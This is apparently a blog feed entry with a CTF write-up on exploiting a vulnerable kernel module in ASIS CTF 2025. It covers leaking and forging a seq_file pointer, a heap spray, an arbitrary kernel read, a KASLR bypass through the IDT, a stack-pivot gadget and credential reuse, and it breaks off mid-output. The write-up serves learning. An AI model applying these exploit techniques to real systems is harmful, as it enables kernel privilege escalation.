<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="https://jkrshnmenon.github.io/feed.xml" rel="self" type="application/atom+xml"/><link href="https://jkrshnmenon.github.io/" rel="alternate" type="text/html" hreflang="en"/><updated>2025-10-22T08:59:01+00:00</updated><id>https://jkrshnmenon.github.io/feed.xml</id><title type="html">Jayakrishna Menon Vadayath</title><subtitle>Random ramblings of a CTF player </subtitle><entry><title type="html">ASIS CTF 2025 File No! Writeup</title><link href="https://jkrshnmenon.github.io/blog/2025/asisctf25fileno/" rel="alternate" type="text/html" title="ASIS CTF 2025 File No! Writeup"/><published>2025-09-06T15:09:00+00:00</published><updated>2025-09-06T15:09:00+00:00</updated><id>https://jkrshnmenon.github.io/blog/2025/asisctf25fileno</id><content type="html" xml:base="https://jkrshnmenon.github.io/blog/2025/asisctf25fileno/"><![CDATA[<p>So, I’ve finally gotten around to trying out a kernel pwning challenge.</p> <p>I picked this one mostly because there weren’t many people working on it and I thought it would be a good learning experience. And I certainly learned a lot.</p> <p>Full disclosure, ChatGPT did help me with understanding some of the kernel stuff. But it also turns out that its pretty bad at coming up with an exploit strategy (at least for this challenge).</p> <h2 id="the-challenge">The challenge</h2> <p>We’re given all the usual stuff for a kernel challenge including the <code class="language-plaintext highlighter-rouge">bzImage</code>, <code class="language-plaintext highlighter-rouge">rootfs.ext4</code>, a <code class="language-plaintext highlighter-rouge">run</code> script and the source code for the vulnerable kernel module.</p> <p>Here’s the important bit from the module:</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">val</span><span class="p">;</span>
<span class="p">}</span> <span class="n">req_t</span><span class="p">;</span>

<span class="k">static</span> <span class="kt">long</span> <span class="nf">module_ioctl</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">filp</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">cmd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">arg</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">req_t</span> <span class="n">req</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">target</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">cmd</span> <span class="o">!=</span> <span class="n">CMD_READ</span> <span class="o">&amp;&amp;</span> <span class="n">cmd</span> <span class="o">!=</span> <span class="n">CMD_WRITE</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">req</span><span class="p">,</span> <span class="p">(</span><span class="n">req_t</span> <span class="n">__user</span> <span class="o">*</span><span class="p">)</span><span class="n">arg</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">req</span><span class="p">)))</span> <span class="p">{</span>
    <span class="k">return</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="n">mutex_lock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">module_lock</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">target</span> <span class="o">=</span> <span class="n">fget</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="n">fd</span><span class="p">)))</span> <span class="p">{</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="n">EBADF</span><span class="p">;</span>
    <span class="k">goto</span> <span class="n">unlock_on_fail</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">S_ISREG</span><span class="p">(</span><span class="n">file_inode</span><span class="p">(</span><span class="n">target</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">i_mode</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="n">EBADF</span><span class="p">;</span>
    <span class="k">goto</span> <span class="n">unlock_on_fail</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">cmd</span> <span class="o">==</span> <span class="n">CMD_READ</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">req</span><span class="p">.</span><span class="n">val</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">target</span><span class="o">-&gt;</span><span class="n">private_data</span><span class="p">;</span>                         <span class="c1">// &lt;--- BUG HERE</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">copy_to_user</span><span class="p">((</span><span class="n">req_t</span> <span class="n">__user</span> <span class="o">*</span><span class="p">)</span><span class="n">arg</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">req</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">req</span><span class="p">)))</span> <span class="p">{</span>
      <span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
      <span class="k">goto</span> <span class="n">unlock_on_fail</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="n">target</span><span class="o">-&gt;</span><span class="n">private_data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">req</span><span class="p">.</span><span class="n">val</span><span class="p">;</span>                        <span class="c1">// &lt;--- BUG HERE</span>
  <span class="p">}</span>

 <span class="nl">unlock_on_fail:</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">target</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">fput</span><span class="p">(</span><span class="n">target</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="n">mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">module_lock</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <p>What this module basically does is, it allows the user to read or write a <code class="language-plaintext highlighter-rouge">void *private_data</code> member in a <code class="language-plaintext highlighter-rouge">struct file</code> which I assumed would be something that can store any extra data.</p> <p>After consulting with ChatGPT, I learned that this <code class="language-plaintext highlighter-rouge">private_data</code> pointer is just a <code class="language-plaintext highlighter-rouge">NULL</code> pointer for regular files on disk, but for special files like the ones in <code class="language-plaintext highlighter-rouge">/proc/</code>, this pointer points to a special <code class="language-plaintext highlighter-rouge">struct seq_file</code> structure.</p> <p>This can easily be confirmed quickly by opening a file like <code class="language-plaintext highlighter-rouge">/proc/self/maps</code> and using its fd to read the <code class="language-plaintext highlighter-rouge">private_data</code> pointer using the module’s <code class="language-plaintext highlighter-rouge">CMD_READ</code> command and comparing it with a regular file.</p> <pre>
<span style="color:#6c6;">~ $</span> <span style="color:#69f;">./exploit</span>
<span style="color:#ccc;">Opening vulnerable device</span> <span style="color:#f96;">/dev/vuln.ko</span>
<span style="color:#ccc;">Opening</span> <span style="color:#f96;">/proc/self/maps</span> <span style="color:#aaa;">(fd = 2)</span>
<span style="color:#ccc;">Opening</span> <span style="color:#f96;">/exploit.c</span> <span style="color:#aaa;">(fd = 3)</span>
<span style="color:#ccc;">Sending ioctl to read from</span> <span style="color:#f96;">/proc/self/maps</span> <span style="color:#aaa;">(request.fd = 2)</span>
<span style="color:#9f9;">Val = ffff8ab001b67000</span>                 &lt;----- Leaked private_data pointer for /proc/self/maps
<span style="color:#ccc;">Sending ioctl to read from</span> <span style="color:#f96;">/exploit.c</span> <span style="color:#aaa;">(request.fd = 3)</span>
<span style="color:#9f9;">Val = 0</span>                                &lt;----- NULL pointer for regular file
</pre> <p>So, this confirms that the <code class="language-plaintext highlighter-rouge">private_data</code> pointer for <code class="language-plaintext highlighter-rouge">/proc/self/maps</code> is indeed a valid pointer to a <code class="language-plaintext highlighter-rouge">struct seq_file</code>. With this knowledge, the next step is to figure out how to fake a <code class="language-plaintext highlighter-rouge">struct seq_file</code> to get the flag.</p> <p>The flag is mounted into the VM as a drive:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-drive</span> <span class="nv">file</span><span class="o">=</span>/tmp/flag.txt,format<span class="o">=</span>raw,index<span class="o">=</span>1
</code></pre></div></div> <p>It’s available inside the VM as <code class="language-plaintext highlighter-rouge">/dev/sdb</code></p> <pre>
<span style="color:#6c6;">~ $</span> <span style="color:#69f;">whoami</span>
<span style="color:#f96;">root</span>
<span style="color:#6c6;">~ $</span> <span style="color:#69f;">cat /dev/sdb</span>
<span style="color:#f96;">FLAG{dummy}</span>
</pre> <p>So, our objective is to just run <code class="language-plaintext highlighter-rouge">cat /dev/sdb</code> as root.</p> <h2 id="the-struct-seq_file">The struct seq_file</h2> <p>The <code class="language-plaintext highlighter-rouge">struct seq_file</code> has a relatively simple layout:</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">seq_file</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span>                        <span class="c1">// Pointer to a buffer</span>
<span class="p">...</span>                                   <span class="c1">// A bunch of size_t integers</span>
    <span class="k">const</span> <span class="k">struct</span> <span class="n">seq_operations</span> <span class="o">*</span><span class="n">op</span><span class="p">;</span>  <span class="c1">// Pointer to seq_operations</span>
<span class="p">...</span>
<span class="p">};</span>
</code></pre></div></div> <p>I’ve only included the really important members here. The <code class="language-plaintext highlighter-rouge">buf</code> member is a pointer to a buffer which is essentially used for buffering some data. The <code class="language-plaintext highlighter-rouge">op</code> member points to a <code class="language-plaintext highlighter-rouge">struct seq_operations</code> which is a struct of function pointers.</p> <p>With a fake <code class="language-plaintext highlighter-rouge">struct seq_file</code>, we can control the <code class="language-plaintext highlighter-rouge">buf</code> pointer and the <code class="language-plaintext highlighter-rouge">op</code> pointers which would theoretically provide us with PC control and arbitrary read primitives.</p> <h2 id="strategy">Strategy</h2> <p>For some reason, I found that the flag was in the memory of my VM. I could see it when I ran <code class="language-plaintext highlighter-rouge">search-pattern FLAG</code> in GDB. So my idea was to just read the memory of the kernel to find the flag. And so I spent some time working on the arbitrary read primitive.</p> <p>At the same time, @zolutal and @dbena were not able to find the flag in memory on their machines (I have no idea why), and so they were working on a ROP chain to call <code class="language-plaintext highlighter-rouge">cat /dev/sdb</code> which would be invoked using the PC control primitive. However, since we did not have a kernel text leak, this would have to involve some brute-forcing. According to @zolutal, this would be a 1/512 chance of success.</p> <h2 id="arbitrary-read">Arbitrary read</h2> <h3 id="heap-spray">Heap spray</h3> <p>In order to craft a fake <code class="language-plaintext highlighter-rouge">struct seq_file</code> and overwrite the <code class="language-plaintext highlighter-rouge">private_data</code> pointer to this fake structure, I needed to first make sure that the fake structure would be present at some offset from the leaked <code class="language-plaintext highlighter-rouge">private_data</code> pointer.</p> <p>@zolutal suggested that simply creating a bunch of mmaped pages and filling them with fake <code class="language-plaintext highlighter-rouge">struct seq_file</code> structures would be a good way to do this. And so I ended up with this code to do the heap spray:</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="c1">// This is where I found the flag in memory using GDB</span>
  <span class="kt">size_t</span> <span class="n">flag_addr</span> <span class="o">=</span> <span class="mh">0xffff888002ede000</span><span class="p">;</span>

  <span class="c1">// Spray fake seq structures</span>
  <span class="c1">// Two 0xdeadbeefcafebabe values are for me to find the sprayed structures in memory</span>
  <span class="n">seq_t</span> <span class="n">fake_seq</span> <span class="o">=</span> <span class="p">{(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">flag_addr</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0xdeadbeefcafebabe</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0xdeadbeefcafebabe</span><span class="p">};</span>

  <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">5000</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">seq_t</span> <span class="o">*</span><span class="n">spray</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span> <span class="o">|</span> <span class="n">MAP_ANONYMOUS</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">spray</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">perror</span><span class="p">(</span><span class="s">"mmap"</span><span class="p">);</span>
      <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">memcpy</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">spray</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">fake_seq</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">seq_t</span><span class="p">));</span>
  <span class="p">}</span>

  <span class="n">puts</span><span class="p">(</span><span class="s">"Finished spray"</span><span class="p">);</span>
</code></pre></div></div> <p>I found that this was enough to put a fake structure at an offset of <code class="language-plaintext highlighter-rouge">-0x42e000</code> from the leaked <code class="language-plaintext highlighter-rouge">private_data</code> pointer.</p> <h3 id="leaking-memory">Leaking memory</h3> <p>My plan for the arbitrary read was to craft a fake <code class="language-plaintext highlighter-rouge">struct seq_file</code> with the <code class="language-plaintext highlighter-rouge">buf</code> pointing to the address where the flag was located in memory and then to use the <code class="language-plaintext highlighter-rouge">seq_read</code> function to read the flag into user space.</p> <p>In order to do that, I had to avoid any of the <code class="language-plaintext highlighter-rouge">ops</code> functions from being invoked as that would just crash. And I found this part of the <code class="language-plaintext highlighter-rouge">seq_read_iter</code> function (called by <code class="language-plaintext highlighter-rouge">seq_read</code> to actually do the reading) which avoids the <code class="language-plaintext highlighter-rouge">ops</code> functions.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="cm">/*
     * if request is to read from zero offset, reset iterator to first
     * record as it might have been already advanced by previous requests
     */</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">iocb</span><span class="o">-&gt;</span><span class="n">ki_pos</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>                     <span class="c1">// &lt;------- HAVE TO AVOID THIS</span>
        <span class="n">m</span><span class="o">-&gt;</span><span class="n">index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">m</span><span class="o">-&gt;</span><span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">...</span>
    <span class="c1">// something left in the buffer - copy it out first</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">m</span><span class="o">-&gt;</span><span class="n">count</span><span class="p">)</span> <span class="p">{</span>                             <span class="c1">// &lt;------- OTHERWISE THIS BRANCH WILL NOT BE TAKEN</span>
        <span class="n">n</span> <span class="o">=</span> <span class="n">copy_to_iter</span><span class="p">(</span><span class="n">m</span><span class="o">-&gt;</span><span class="n">buf</span> <span class="o">+</span> <span class="n">m</span><span class="o">-&gt;</span><span class="n">from</span><span class="p">,</span> <span class="n">m</span><span class="o">-&gt;</span><span class="n">count</span><span class="p">,</span> <span class="n">iter</span><span class="p">);</span>
        <span class="n">m</span><span class="o">-&gt;</span><span class="n">count</span> <span class="o">-=</span> <span class="n">n</span><span class="p">;</span>
        <span class="n">m</span><span class="o">-&gt;</span><span class="n">from</span> <span class="o">+=</span> <span class="n">n</span><span class="p">;</span>
        <span class="n">copied</span> <span class="o">+=</span> <span class="n">n</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">m</span><span class="o">-&gt;</span><span class="n">count</span><span class="p">)</span>	<span class="c1">// hadn't managed to copy everything</span>
            <span class="k">goto</span> <span class="n">Done</span><span class="p">;</span>
</code></pre></div></div> <p>I found that I just needed to update my fake <code class="language-plaintext highlighter-rouge">struct seq_file</code> with the following data:</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">fake_seq</span><span class="p">.</span><span class="n">buf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">flag_addr</span><span class="p">;</span>
  <span class="n">fake_seq</span><span class="p">.</span><span class="n">from</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">fake_seq</span><span class="p">.</span><span class="n">count</span> <span class="o">=</span> <span class="mh">0x1000</span><span class="p">;</span>
  <span class="n">fake_seq</span><span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="mh">0x1000</span><span class="p">;</span>
  <span class="n">fake_seq</span><span class="p">.</span><span class="n">read_pos</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</code></pre></div></div> <p>And combined with an lseek, I could trigger the branch that executes the <code class="language-plaintext highlighter-rouge">goto Done;</code> thus avoiding any of the <code class="language-plaintext highlighter-rouge">ops</code> functions.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="c1">// leak_addr comes from the CMD_READ ioctl</span>
  <span class="kt">uint64_t</span> <span class="n">leak_page</span> <span class="o">=</span> <span class="n">leak_addr</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xfff</span><span class="p">;</span>
  <span class="kt">uint64_t</span> <span class="n">offset</span> <span class="o">=</span> <span class="mh">0x42e000</span><span class="p">;</span>
  <span class="kt">uint64_t</span> <span class="n">fake_seq_addr</span> <span class="o">=</span> <span class="n">leak_page</span> <span class="o">-</span> <span class="n">offset</span><span class="p">;</span>

  <span class="n">request</span><span class="p">.</span><span class="n">val</span> <span class="o">=</span> <span class="n">fake_seq_addr</span><span class="p">;</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">"Overwriting private_data with %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">request</span><span class="p">.</span><span class="n">val</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">vuln_fd</span><span class="p">,</span> <span class="n">CMD_WRITE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">request</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">perror</span><span class="p">(</span><span class="s">"ioctl"</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="kt">char</span> <span class="n">flag_buf</span><span class="p">[</span><span class="mh">0x100</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
  <span class="n">lseek</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">);</span>
  <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">flag_buf</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">"FLAG %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">flag_buf</span><span class="p">);</span>
</code></pre></div></div> <p>And this was working and printing the flag on my machine:</p> <pre>
<span style="color:#6c6;">#</span> <span style="color:#69f;">./exploit</span>
<span style="color:#ccc;">Opening vulnerable device...</span>
<span style="color:#ccc;">Opening</span> <span style="color:#f96;">/proc/self/maps...</span>
<span style="color:#ccc;">Sending ioctl to read from sys file</span>
<span style="color:#9f9;">Private data leak = 0xffff888002f67b40</span>
<span style="color:#ccc;">Finished spray</span>
<span style="color:#9f9;">Overwriting private_data with 0xffff888002b39000</span>
<span style="color:#ff5555;font-weight:bold;">FLAG FLAG{dummy}</span>
</pre> <p>But this wasn’t working on anyone else’s machine. However, I could just replace the <code class="language-plaintext highlighter-rouge">flag_addr</code> with any address that I wanted to read which was basically an arbitrary read primitive.</p> <h2 id="its-rop-time">It’s ROP time</h2> <p>By the time I had gotten to this point, @zolutal and @dbena had come up with a ROP chain to call <code class="language-plaintext highlighter-rouge">cat /dev/sdb</code> using the PC control primitive.</p> <h3 id="leaking-kernel-base">Leaking kernel base</h3> <p>After asking @zolutal and @kylebot, it turns out that there’s an area of the kernel which is not randomized. The Interrupt Descriptor Table (IDT), apparently is always at the address <code class="language-plaintext highlighter-rouge">0xfffffe0000000000</code>.</p> <p>According to @zolutal, everything in the CPU Entry Area is randomized except for this IDT. Now this IDT is a table of <code class="language-plaintext highlighter-rouge">struct idt_entry</code> elements. And each <code class="language-plaintext highlighter-rouge">struct idt_entry</code> has a layout like this:</p> <pre>
<span style="color:#69f;">offset</span>  <span style="color:#69f;">size</span>  <span style="color:#69f;">field</span>
<span style="color:#aaa;">------  ----  ----------------------------</span>
<span style="color:#6c6;">0x00</span>     <span style="color:#9f9;">2</span>    <span style="color:#f96;">offset0</span>      <span style="color:#aaa;">(addr bits 0..15)</span>
<span style="color:#6c6;">0x02</span>     <span style="color:#9f9;">2</span>    <span style="color:#f96;">selector</span>
<span style="color:#6c6;">0x04</span>     <span style="color:#9f9;">2</span>    <span style="color:#f96;">ist:type:dpl:p</span>  <span style="color:#aaa;">(attributes word)</span>
<span style="color:#6c6;">0x06</span>     <span style="color:#9f9;">2</span>    <span style="color:#f96;">offset1</span>      <span style="color:#aaa;">(addr bits 16..31)</span>
<span style="color:#6c6;">0x08</span>     <span style="color:#9f9;">4</span>    <span style="color:#f96;">offset2</span>      <span style="color:#aaa;">(addr bits 32..63)</span>
<span style="color:#6c6;">0x0c</span>     <span style="color:#9f9;">4</span>    <span style="color:#f96;">reserved</span>
</pre> <p>By reading the first element of the IDT, we can get a pointer to the kernel text segment which defeats KASLR. We don’t need the whole <code class="language-plaintext highlighter-rouge">struct idt_entry</code> to do this, just the bytes from 4 to 12 which contains the <code class="language-plaintext highlighter-rouge">&lt;offset2:4bytes&gt;&lt;offset1:2bytes&gt;&lt;ist:type:dpl:p:2bytes&gt;</code> which gives us all but the last 2 bytes of the address. And since the kernel text base is aligned to a 2MiB boundary, the last 2 bytes are always <code class="language-plaintext highlighter-rouge">0x0000</code>.</p> <p>So my script was now updated to do this:</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="c1">// IDT (0xfffffe0000000000) + 4</span>
  <span class="kt">size_t</span> <span class="n">flag_addr</span> <span class="o">=</span> <span class="mh">0xfffffe0000000004</span><span class="p">;</span>
<span class="p">...</span>
<span class="p">...</span>
  <span class="kt">char</span> <span class="n">flag_buf</span><span class="p">[</span><span class="mh">0x100</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
  <span class="n">lseek</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">);</span>
  <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">flag_buf</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>

  <span class="c1">// -0x8e00 to zero-out the last 2 bytes</span>
  <span class="kt">uint64_t</span> <span class="n">kaslr</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="n">flag_buf</span><span class="p">)</span><span class="o">-</span><span class="mh">0x8e00</span><span class="p">;</span>
</code></pre></div></div> <h3 id="rop-chain">ROP chain</h3> <p>Since we had already sprayed a bunch of <code class="language-plaintext highlighter-rouge">struct seq_file</code> structures, we could just update them in order to place correct <code class="language-plaintext highlighter-rouge">seq_operations</code> pointers within them.</p> <p>When any of the <code class="language-plaintext highlighter-rouge">ops</code> functions are called, the first argument is always a pointer to the <code class="language-plaintext highlighter-rouge">struct seq_file</code>. So, if we could find a gadget that can move the value of <code class="language-plaintext highlighter-rouge">rdi</code> into <code class="language-plaintext highlighter-rouge">rsp</code>, we could pivot the stack into a ROP chain.</p> <p>And surprisingly, there was this gadget in the kernel:</p> <pre>
<span style="color:cyan">(remote) gef➤</span> <span style="color:lightgreen">x/6i 0xffffffff814b1a35</span>
   <span style="color:yellow">0xffffffff814b1a35</span>:	<span style="color:lightblue;font-weight:bold">push</span>   <span style="color:white">rdi</span>
   <span style="color:yellow">0xffffffff814b1a36</span>:	<span style="color:lightblue;font-weight:bold">mov</span>    <span style="color:white">ebx</span>,<span style="color:orange">0x415bfffa</span>
   <span style="color:yellow">0xffffffff814b1a3b</span>:	<span style="color:lightblue;font-weight:bold">pop</span>    <span style="color:white">rsp</span>
   <span style="color:yellow">0xffffffff814b1a3c</span>:	<span style="color:lightblue;font-weight:bold">cdqe</span>
   <span style="color:yellow">0xffffffff814b1a3e</span>:	<span style="color:lightblue;font-weight:bold">pop</span>    <span style="color:white">rbp</span>
   <span style="color:yellow">0xffffffff814b1a3f</span>:	<span style="color:lightblue;font-weight:bold">ret</span>
</pre> <p>Which does exactly that.</p> <h3 id="privlege-escalation">Privlege Escalation</h3> <p>The first thing I remember from my kernel exploitation reading was that the <code class="language-plaintext highlighter-rouge">commit_creds(prepare_kernel_cred(0))</code> was the way to go for privilege escalation. However, it turns out that we could just re-use a creds structure from an existing process.</p> <p>The <code class="language-plaintext highlighter-rouge">struct task_struct</code> has two pointers to <code class="language-plaintext highlighter-rouge">struct cred</code> structures followed by a <code class="language-plaintext highlighter-rouge">comm</code> buffer.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="cm">/* Objective and real subjective task credentials (COW): */</span>
    <span class="k">const</span> <span class="k">struct</span> <span class="n">cred</span> <span class="n">__rcu</span>		<span class="o">*</span><span class="n">real_cred</span><span class="p">;</span>

    <span class="cm">/* Effective (overridable) subjective task credentials (COW): */</span>
    <span class="k">const</span> <span class="k">struct</span> <span class="n">cred</span> <span class="n">__rcu</span>		<span class="o">*</span><span class="n">cred</span><span class="p">;</span>

    <span class="cm">/*
     * executable name, excluding path.
     *
     * - normally initialized begin_new_exec()
     * - set it with set_task_comm()
     *   - strscpy_pad() to ensure it is always NUL-terminated and
     *     zero-padded
     *   - task_lock() to ensure the operation is atomic and the name is
     *     fully updated.
     */</span>
    <span class="kt">char</span>				<span class="n">comm</span><span class="p">[</span><span class="n">TASK_COMM_LEN</span><span class="p">];</span>
</code></pre></div></div> <p>Now, for the <code class="language-plaintext highlighter-rouge">init_task</code>, the comm is <code class="language-plaintext highlighter-rouge">swapper</code>. So if we search the memory in GDB for <code class="language-plaintext highlighter-rouge">swapper</code>, we can find the <code class="language-plaintext highlighter-rouge">real_cred</code> and <code class="language-plaintext highlighter-rouge">cred</code> pointers just before this string which give us the pointer to a <code class="language-plaintext highlighter-rouge">struct creds</code> for the <code class="language-plaintext highlighter-rouge">init</code> process which is running as root.</p> <pre>
<span style="color:cyan">(remote) gef➤</span> <span style="color:lightgreen">search-pattern swapper</span>
<span style="color:gray">[+] Searching 'swapper' in memory</span>
<span style="color:gray">[+] In (</span><span style="color:yellow">0xffff888001a00000</span>-<span style="color:yellow">0xffff888001caf000</span><span style="color:gray">), permission=r--</span>
  <span style="color:yellow">0xffff888001c2533e</span> - <span style="color:yellow">0xffff888001c25345</span>  →   <span style="color:lightblue">"swapper"</span>
<span style="color:gray">[+] In (</span><span style="color:yellow">0xffff888001caf000</span>-<span style="color:yellow">0xffff8880020dc000</span><span style="color:gray">), permission=rw-</span>
  <span style="color:yellow">0xffff888001e0ca50</span> - <span style="color:yellow">0xffff888001e0ca59</span>  →   <span style="color:lightblue">"swapper/0"</span>
<span style="color:gray">[+] In (</span><span style="color:yellow">0xffffffff81a00000</span>-<span style="color:yellow">0xffffffff81caf000</span><span style="color:gray">), permission=r--</span>
  <span style="color:yellow">0xffffffff81c2533e</span> - <span style="color:yellow">0xffffffff81c25345</span>  →   <span style="color:lightblue">"swapper"</span>
<span style="color:gray">[+] In (</span><span style="color:yellow">0xffffffff81caf000</span>-<span style="color:yellow">0xffffffff820dc000</span><span style="color:gray">), permission=rw-</span>
